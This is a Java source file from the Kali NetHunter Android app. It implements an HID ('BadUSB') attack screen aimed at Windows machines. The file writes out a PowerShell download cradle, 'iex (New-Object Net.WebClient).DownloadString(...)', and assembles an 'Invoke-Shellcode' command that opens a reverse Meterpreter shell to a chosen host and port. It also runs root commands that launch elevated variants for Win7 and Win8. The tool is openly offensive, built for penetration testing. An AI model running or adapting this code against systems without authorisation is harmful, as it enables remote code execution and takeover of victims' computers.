package com.offsec.nethunter;

import android.app.ActionBar;
import android.app.AlertDialog;
import android.app.FragmentTransaction;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.app.NavUtils;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class HidActivity extends FragmentActivity implements ActionBar.TabListener {


    AppSectionsPagerAdapter mAppSectionsPagerAdapter;
    ViewPager mViewPager;


    private Integer selectedPlatformIndex = 0;
    final CharSequence[] platforms = {"General", "Win7", "Win8"};
    private static Context context;
    private static final String configFilePath = "/data/local/kali-armhf/var/www/payload";

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = getApplicationContext();
        setContentView(R.layout.hid);
        if (Build.VERSION.SDK_INT >= 21) {
            // detail for android 5 devices
            getWindow().setStatusBarColor(getResources().getColor(R.color.darkTitle));

        }
        mAppSectionsPagerAdapter = new AppSectionsPagerAdapter(getSupportFragmentManager());

        final ActionBar actionBar = getActionBar();

        actionBar.setHomeButtonEnabled(false);
        actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mAppSectionsPagerAdapter);

        mViewPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                actionBar.setSelectedNavigationItem(position);
                invalidateOptionsMenu();
            }
        });

        actionBar.addTab(
                actionBar.newTab()
                        .setText("PowerSploit")
                        .setTabListener(this));
        actionBar.addTab(
                actionBar.newTab()
                        .setText("Windows CMD")
                        .setTabListener(this));
        ActionBarCompat.setDisplayHomeAsUpEnabled(this);

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.hid, menu);
        return super.onCreateOptionsMenu(menu);
    }


    public boolean onPrepareOptionsMenu(Menu menu) {
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            menu.findItem(R.id.source_button).setVisible(true);
        } else {
            menu.findItem(R.id.source_button).setVisible(false);
        }
        invalidateOptionsMenu();
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home:
                NavUtils.navigateUpFromSameTask(this);
                return true;
            case R.id.start_service:
                start();
                return true;
            case R.id.stop_service:
                reset();
                return true;
            case R.id.admin:
                openDialog();
                return true;
            case R.id.source_button:
                Intent i = new Intent(this, EditSourceActivity.class);
                i.putExtra("path", configFilePath);
                i.putExtra("shell", true);
                startActivity(i);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    private void start() {
        String[] command = new String[1];
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            switch (selectedPlatformIndex) {
                case 0:
                    command[0] = "start-rev-met";
                    break;
                case 1:
                    command[0] = "start-rev-met-elevated-win7";
                    break;
                default:
                    command[0] = "start-rev-met-elevated-win8";
                    break;
            }
        } else if (pageNum == 1) {
            switch (selectedPlatformIndex) {
                case 0:
                    command[0] = "start-hid-cmd";
                    break;
                case 1:
                    command[0] = "start-hid-cmd-elevated-win7";
                    break;
                default:
                    command[0] = "start-hid-cmd-elevated-win8";
                    break;
            }
        }
        ShellExecuter exe = new ShellExecuter();
        exe.RunAsRoot(command);
        showMessage("Attack executed");
    }

    private void reset() {
        ShellExecuter exe = new ShellExecuter();
        String[] command = {"stop-badusb"};
        exe.RunAsRoot(command);
        showMessage("Reseting USB");
    }
    //
    // this never is called
    //
    // public void onPageSelected(int pageNum) {
    //    int currentposition = pageNum;
    //    invalidateOptionsMenu();
    // }

    public void openDialog() {

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Pick platform:");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
            }
        });

        builder.setSingleChoiceItems(platforms, selectedPlatformIndex, new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                selectedPlatformIndex = which;
            }
        });
        builder.show();
    }


    @Override
    public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
    }

    @Override
    public void onTabSelected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
        // When the given tab is selected, switch to the corresponding page in the ViewPager.
        mViewPager.setCurrentItem(tab.getPosition());
    }

    @Override
    public void onTabReselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
    }

    public static void showMessage(String message) {
        int duration = Toast.LENGTH_SHORT;
        Toast toast = Toast.makeText(context, message, duration);
        toast.setGravity(Gravity.TOP | Gravity.CENTER_HORIZONTAL, 0, 0);
        toast.show();
    }

    /**
     * A {@link FragmentPagerAdapter} that returns a fragment corresponding to one of the primary
     * sections of the app.
     */
    public static class AppSectionsPagerAdapter extends FragmentPagerAdapter {

        public AppSectionsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int i) {
            switch (i) {
                case 0:
                    return new PowerSploitFragment();

                default:
                    return new WindowsCmdFragment();
            }
        }

        @Override
        public int getCount() {
            return 2;
        }
    }

    /**
     * A fragment that launches other parts of the demo application.
     */
    public static class PowerSploitFragment extends Fragment implements OnClickListener {

        private String configFilePath = "/data/local/kali-armhf/var/www/payload";
        private String configFileUrlPath = "files/powersploit-url";

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);

            Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
            b.setOnClickListener(this);

            return rootView;
        }

        @Override
        public void onResume() {
            super.onResume();
            loadOptions();
        }

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.powersploitOptionsUpdate:
                    try {
                        File sdcard = Environment.getExternalStorageDirectory();
                        File myFile = new File(sdcard, configFileUrlPath);
                        myFile.createNewFile();
                        FileOutputStream fOut = new FileOutputStream(myFile);
                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);

                        EditText newPayloadUrl = (EditText) getView().findViewById(R.id.payloadUrl);
                        String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\")";
                        myOutWriter.append(newText);
                        myOutWriter.close();
                        fOut.close();
                    } catch (Exception e) {
                        showMessage(e.getMessage());
                        return;
                    }

                    EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                    EditText port = (EditText) getView().findViewById(R.id.port);

                    Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                    String payloadValue = payload.getSelectedItem().toString();

                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";


                    ShellExecuter exe = new ShellExecuter();
                    String source = exe.Executer("cat " + configFilePath);

                    String regExPat = "^Invoke-Shellcode -Payload(.*)$";
                    Pattern pattern = Pattern.compile(regExPat, Pattern.MULTILINE);
                    Matcher matcher = pattern.matcher(source);
                    if (matcher.find()) {
                        source = source.replace(matcher.group(0), newString);
                        String[] command = {"sh", "-c", "cat <<'EOF' > " + configFilePath + "\n" + source + "\nEOF"};
                        exe.RunAsRoot(command);
                        showMessage("Options updated:");
                    } else {
                        showMessage("Options not updated!");
                    }
                    break;
                default:
                    showMessage("Unknown click");
                    break;
            }
        }


        private void loadOptions() {
            File sdcard = Environment.getExternalStorageDirectory();
            File file = new File(sdcard, configFileUrlPath);
            StringBuilder textUrl = new StringBuilder();
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    textUrl.append(line);
                    textUrl.append('\n');
                }
                br.close();

                EditText payloadUrl = (EditText) getView().findViewById(R.id.payloadUrl);

                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
                if (matcherPayloadUrl.find()) {
                    String payloadUrlValue = matcherPayloadUrl.group(1);
                    payloadUrl.setText(payloadUrlValue);
                }

            } catch (IOException e) {
                Log.e("Nethunter", "exception", e);
            }

            ShellExecuter exe = new ShellExecuter();
            String text = exe.Executer("cat " + configFilePath);


            String[] lines = text.split("\n");
            String line = lines[lines.length - 1];


            String regExPatIp = "-Lhost\\ (.*)\\ -Lport";
            Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
            Matcher matcherIp = patternIp.matcher(line);
            if (matcherIp.find()) {
                String ipValue = matcherIp.group(1);
                EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                ip.setText(ipValue);
            }


            String regExPatPort = "-Lport\\ (.*)\\ -Force";
            Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
            Matcher matcherPort = patternPort.matcher(line);
            if (matcherPort.find()) {
                String portValue = matcherPort.group(1);
                EditText port = (EditText) getView().findViewById(R.id.port);
                port.setText(portValue);
            }

            String regExPatPayload = "-Payload\\ (.*)\\ -Lhost";
            Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
            Matcher matcherPayload = patternPayload.matcher(line);
            if (matcherPayload.find()) {
                String payloadValue = matcherPayload.group(1);

                Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                ArrayAdapter myAdap = (ArrayAdapter) payload.getAdapter();

                int spinnerPosition;
                spinnerPosition = myAdap.getPosition(payloadValue);
                payload.setSelection(spinnerPosition);
            }
        }
    }


    public static class WindowsCmdFragment extends Fragment implements OnClickListener {

        private String configFilePath = "files/hid-cmd.conf";

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
            EditText source = (EditText) rootView.findViewById(R.id.windowsCmdSource);
            File sdcard = Environment.getExternalStorageDirectory();
            File file = new File(sdcard, configFilePath);
            StringBuilder text = new StringBuilder();
            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;
                while ((line = br.readLine()) != null) {
                    text.append(line);
                    text.append('\n');
                }
                br.close();
            } catch (IOException e) {
                Log.e("Nethunter", "exception", e);
            }
            source.setText(text);

            Button b = (Button) rootView.findViewById(R.id.windowsCmdUpdate);
            b.setOnClickListener(this);
            return rootView;
        }

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.windowsCmdUpdate:
                    EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                    String text = source.getText().toString();
                    try {
                        File sdcard = Environment.getExternalStorageDirectory();
                        File myFile = new File(sdcard, configFilePath);
                        myFile.createNewFile();
                        FileOutputStream fOut = new FileOutputStream(myFile);
                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                        myOutWriter.append(text);
                        myOutWriter.close();
                        fOut.close();
                        showMessage("Source updated");
                    } catch (Exception e) {
                        showMessage(e.getMessage());
                    }
                    break;
                default:
                    showMessage("Unknown click");
                    break;
            }
        }
    }
}